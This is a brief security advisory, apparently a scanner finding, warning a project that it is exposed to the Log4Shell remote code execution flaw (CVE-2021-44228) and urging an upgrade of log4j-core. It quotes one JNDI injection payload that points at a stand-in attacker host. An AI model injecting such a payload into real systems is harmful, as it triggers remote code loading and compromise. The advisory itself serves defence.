title: Remote code execution via Log4Shell (CVE-2021-44228)
description: Your project is vulnerable to the Log4Shell vulnerability CVE-2021-44228. An attacker can send a crafted JNDI lookup string such as ${jndi:ldap://attacker.com/a} that gets evaluated and leads to remote code execution. This is the same critical vulnerability that affected Apache Log4j. Please patch immediately by upgrading log4j-core to 2.17.0 or later.
